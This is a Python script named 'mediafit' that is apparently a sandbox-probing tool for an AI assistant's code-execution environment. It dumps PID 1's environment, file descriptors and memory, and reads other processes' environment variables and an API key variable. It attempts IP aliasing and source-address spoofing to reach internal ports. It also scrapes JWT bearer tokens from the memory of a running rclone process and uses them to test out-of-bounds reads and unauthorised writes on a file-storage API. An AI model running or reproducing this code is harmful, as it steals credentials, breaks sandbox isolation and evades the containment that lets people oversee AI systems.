#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit v5.3.0 -- /proc/1 door, telemetry/rclone forensics, /etc/hosts,
port-2024 long timeout (timeout vs close), range-beyond-EOF, createFile complete."""
import os, sys, json, re, time, ssl, base64, socket, struct, subprocess, traceback
import urllib.request, urllib.error

VER="5.3.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
OUTD="/mnt/user-data/outputs"

OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        "+str(ev)[:1400])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,t=60):
    try:
        p=subprocess.run(a,capture_output=True,timeout=t)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
def rd(path,n=4000):
    try:
        d=open(path,"rb").read(n)
        return d
    except Exception as e:
        return ("ERR:%s"%e).encode()
def dump(label,path,n=1500,split_nul=False):
    d=rd(path,n)
    if d.startswith(b"ERR:"): w("    %-26s %s"%(label,d[:110].decode())); return None
    w("    %-26s (%d b)"%(label,len(d)))
    if split_nul:
        for kv in d.split(b"\x00"):
            if kv.strip(): w("        %s"%kv.decode("utf-8","replace")[:200])
    else:
        for l in d.decode("utf-8","replace").splitlines()[:40]: w("        %s"%l[:220])
    return d
_CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE

def tcp2(ip,port,req=b"",timeout=25,wait=0):
    """returns (data, status) where status in {ok,timeout,refused,error,closed}"""
    try:
        s=socket.create_connection((ip,port),timeout)
    except Exception as e:
        return b"", "refused" if "refused" in str(e) else "error:%s"%str(e)[:40]
    s.settimeout(timeout)
    if wait: time.sleep(wait)
    try:
        if req: s.sendall(req)
    except Exception as e:
        s.close(); return b"", "sendfail:%s"%str(e)[:40]
    d=b""
    try:
        d=s.recv(8000)
        st = "closed" if d==b"" else "ok"
    except socket.timeout:
        st="timeout"
    except Exception as e:
        st="error:%s"%str(e)[:40]
    s.close(); return d, st
def http_json(url, method="POST", token=None, body=None, t=15, hdrs=None):
    h={"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,method=method,headers=h,data=body)
    try:
        r=urllib.request.urlopen(req,timeout=t,context=_CTX); return r.status,r.read(300000)
    except urllib.error.HTTPError as e:
        try: return e.code,e.read()
        except Exception: return e.code,b""
    except Exception as e: return None,("ERR:%s"%e).encode()
def api(m,p,tk=None,t=15):
    return http_json(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"})

# ------------------------------------------------------------------ 1
def s_proc1():
    head("1. /proc/1 DOOR  <== newly opened")
    dump("cmdline","/proc/1/cmdline",600,split_nul=True)
    dump("environ","/proc/1/environ",4000,split_nul=True)
    try:
        st=rd("/proc/1/status",3000).decode("utf-8","replace")
        for l in st.splitlines():
            if l.startswith(("Name","State","Threads","VmRSS","Seccomp","CapEff","CapBnd","NSpid","NoNewPrivs","Uid:","Gid:","SigCgt")):
                w("    status: %s"%l[:160])
    except Exception as e: w("    status -> %s"%e)
    try:
        tgt=os.readlink("/proc/1/cwd"); w("    cwd -> %s"%tgt)
    except Exception as e: w("    cwd -> %s"%str(e)[:60])
    try:
        w("    root -> %s"%os.readlink("/proc/1/root"))
    except Exception as e: w("    root -> %s"%str(e)[:60])
    # fd table: THIS is the prize
    try:
        fds=sorted(os.listdir("/proc/1/fd"), key=lambda x:int(x) if x.isdigit() else 0)
        w("    /proc/1/fd (%d):"%len(fds))
        for fd in fds:
            try: w("        %s -> %s"%(fd,os.readlink("/proc/1/fd/"+fd)))
            except Exception as e: w("        %s -> %s"%(fd,str(e)[:60]))
        rec("P","/proc/1/fd dumped (%d)"%len(fds))
    except Exception as e: w("    /proc/1/fd -> %s"%str(e)[:60])
    # /proc/1/root traversal
    for p in ["etc/hosts","etc/resolv.conf","etc/environment","dev","run","opt","proc/1/root/etc/hosts"]:
        fp="/proc/1/root/"+p
        try:
            if os.path.isdir(fp): w("    root/%s -> dir %s"%(p,sorted(os.listdir(fp))[:14]))
            else: dump("root/"+p,fp,900)
        except Exception as e: w("    root/%s -> %s"%(p,str(e)[:60]))
    # mem attempts
    for how in ["open","pread","dd"]:
        try:
            if how=="open":
                fh=open("/proc/1/mem","rb",0); fh.seek(0x400000); d=fh.read(64); fh.close()
            elif how=="pread":
                fd=os.open("/proc/1/mem",os.O_RDONLY); d=os.pread(fd,64,0x400000); os.close(fd)
            else:
                rc,o,_=sh(["sh","-c","dd if=/proc/1/mem bs=64 count=1 skip=65536 2>/dev/null | xxd | head -3"])
                d=o.encode()
            w("    mem[%s] -> %r"%(how,d[:80])); rec("P","/proc/1/mem readable via %s"%how)
        except Exception as e: w("    mem[%s] -> %s"%(how,str(e)[:70]))
    # ns
    for ns in ["net","mnt","user","pid","cgroup"]:
        try: w("    ns/%s -> %s"%(ns,os.readlink("/proc/1/ns/"+ns)))
        except Exception as e: w("    ns/%s -> %s"%(ns,str(e)[:50]))

# ------------------------------------------------------------------ 2
def s_others():
    head("2. OTHER PROCESSES (telemetry collector / rclone)")
    pids=[p for p in os.listdir("/proc") if p.isdigit()]
    for p in sorted(pids,key=int):
        try: cl=open("/proc/%s/cmdline"%p,"rb").read().replace(b"\x00",b" ").decode("utf-8","replace").strip()
        except Exception: cl="?"
        if not cl: continue
        w("    --- pid %s : %s"%(p,cl[:120]))
        env=rd("/proc/%s/environ"%p,3000)
        if env.startswith(b"ERR:"):
            w("        environ %s"%env[:90].decode())
        else:
            for kv in env.split(b"\x00"):
                if kv.strip(): w("        ENV %s"%kv.decode("utf-8","replace")[:200])
        try:
            fds=sorted(os.listdir("/proc/%s/fd"%p),key=lambda x:int(x) if x.isdigit() else 0)
            for fd in fds[:30]:
                try: w("        fd %s -> %s"%(fd,os.readlink("/proc/%s/fd/%s"%(p,fd))))
                except Exception: pass
        except Exception as e: w("        fd -> %s"%str(e)[:50])

# ------------------------------------------------------------------ 3
def s_etc():
    head("3. /etc/hosts + resolv.conf + proxy env")
    for f in ["/etc/hosts","/etc/resolv.conf","/etc/environment","/etc/mtab","/proc/net/route"]:
        dump(f,f,1200)
    for k in ["HTTP_PROXY","HTTPS_PROXY","ALL_PROXY","NO_PROXY","ANTHROPIC_BASE_URL","ANTHROPIC_API_KEY","SBX_TELEMETRY_INGEST_SOCKET"]:
        w("    env %s = %r"%(k,os.environ.get(k)))

# ------------------------------------------------------------------ 4
def s_port2024():
    head("4. PORT 2024/2025 -- LONG TIMEOUT (timeout vs close)")
    targets=[("127.0.0.1",2024),("192.0.2.2",2024),("127.0.0.1",2025),("192.0.2.2",2025)]
    WS=(b"GET / HTTP/1.1\r\nHost: x\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
        b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n")
    for ip,port in targets:
        for req,lbl in [(b"", "silent-connect"), (WS,"ws-handshake"),
                        (b"GET /status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n","GET /status")]:
            d,st=tcp2(ip,port,req,timeout=20)
            w("    %s:%-5d %-14s -> status=%s data=%r"%(ip,port,lbl,st,d[:200]))
            if st=="ok": rec("P","port %d responds to %s"%(port,lbl))
    # source-IP alias trick (CAP_NET_ADMIN)
    rc,o,e=sh(["sh","-c","ip addr add 10.9.9.9/32 dev eth0 2>&1 || true; ip -4 addr show 2>/dev/null | head -20"])
    w("    ip alias attempt: %s"%(o or e).strip()[:300])
    for ip,port in [("10.9.9.9",2024),("192.0.2.2",2024)]:
        try:
            s=socket.socket(); s.settimeout(8)
            s.bind(("192.0.2.2",0))
            s.connect((ip,port))
            s.sendall(WS)
            try: d=s.recv(2000)
            except socket.timeout: d=b"<timeout>"
            w("    bound-src 192.0.2.2 -> %s:%d -> %r"%(ip,port,d[:200]))
            s.close()
        except Exception as ex: w("    bound-src -> %s:%d -> %s"%(ip,port,str(ex)[:60]))

# ------------------------------------------------------------------ 5
def s_filestore():
    head("5. FILESTORE: range-beyond-EOF + createFile completion")
    tk=None; up=None; fsid=None
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    for pid in os.listdir("/proc"):
        if not pid.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%pid,"rb").read(): continue
            maps=open("/proc/%s/maps"%pid).read().splitlines(); mem=open("/proc/%s/mem"%pid,"rb",0)
        except Exception: continue
        for l in maps:
            try: a,perms=l.split()[0],l.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0,e0=[int(x,16) for x in a.split("-")]
            except Exception: continue
            if not (0<e0-s0<=256*1024*1024): continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d):
                t=m.decode()
                if len(t.split(".")[2])!=86: t=".".join(t.split(".")[:2]+[t.split(".")[2][:86]])
                try: pl=json.loads(base64.urlsafe_b64decode(t.split(".")[1]+"=="))
                except Exception: continue
                f=pl.get("filesystem_id")
                if not f: continue
                st,_=api("listDirectory",{"filesystem_id":f,"path":"/outputs"},t)
                if st==200:
                    fsid=f
                    if "/outputs" in (pl.get("allowed_roots") or []): tk=t
                    if (pl.get("allowed_roots") or [])==["/uploads"]: up=t
    if not tk: rec("U","no token"); return
    w("    fsid=%s write-token=%s uploads-token=%s"%(fsid,bool(tk),bool(up)))
    # range beyond EOF
    if up:
        try:
            from os import listdir
            png=sorted(x for x in listdir("/mnt/user-data/uploads") if x.lower().endswith((".png",".jpg",".jpeg")))[0]
            lsz=os.path.getsize("/mnt/user-data/uploads/"+png)
            st,b=api("readFile",{"filesystem_id":fsid,"path":"/uploads/"+png},up)
            w("    baseline readFile -> %s len=%d local=%d"%(st,len(b),lsz))
            for lbl,off,ln in [("in-bounds",0,16),("at-EOF",lsz,32),("past-EOF",lsz+100,64),
                               ("way-past",lsz+100000,64),("huge-len",0,lsz+5000)]:
                st2,b2=api("readFile",{"filesystem_id":fsid,"path":"/uploads/"+png,
                                       "range":{"offset":off,"length":ln}},up)
                w("    range %-10s off=%-8d len=%-7d -> %s got=%d"%(lbl,off,ln,st2,len(b2)))
                if st2==200 and lbl in ("past-EOF","way-past") and len(b2)>0:
                    rec("P","*** RANGE BEYOND EOF returned %d bytes ***"%len(b2))
        except Exception as e: w("    range -> %s"%e)
    # createFile with media_type
    B="----mf"+base64.urlsafe_b64encode(os.urandom(6)).rstrip(b"=").decode()
    def mp(params,fn,fd):
        o=("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\n"
           "Content-Type: application/json\r\n\r\n"%B).encode()+json.dumps(params).encode()+b"\r\n"
        o+=("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n"%B).encode()+fd+b"\r\n"
        return o+("--%s--\r\n"%B).encode()
    H={"Content-Type":"multipart/form-data; boundary="+B,"Connect-Protocol-Version":"1"}
    api("makeDirectory",{"filesystem_id":fsid,"path":"/outputs"},tk)
    st,b=http_json(FS+"createFile","POST",tk,
                   mp({"filesystem_id":fsid,"path":"/outputs/mf.txt","media_type":"text/plain"},"mf.txt",b"MEDIAFIT-OK"),
                   20,H)
    w("    createFile -> %s %s"%(st,b[:250].decode("utf-8","replace")))
    if st==200: rec("P","*** createFile WORKS ***")
    st,b=api("listDirectory",{"filesystem_id":fsid,"path":"/outputs"},tk)
    w("    listDirectory -> %s %s"%(st,b[:600].decode("utf-8","replace")))
    st,b=api("readFile",{"filesystem_id":fsid,"path":"/outputs/mf.txt"},tk)
    w("    readFile -> %s %r"%(st,b[:120]))

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))

def main():
    for n,f in [("proc1",s_proc1),("others",s_others),("etc",s_etc),
                ("port2024",s_port2024),("filestore",s_filestore),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in [OUTD,"/tmp","/root"]:
        try:
            os.makedirs(d,exist_ok=True)
            with open(os.path.join(d,"mediafit-report.txt"),"w") as fh: fh.write(txt)
        except Exception: pass
    print("\nreport -> %s/mediafit-report.txt"%OUTD)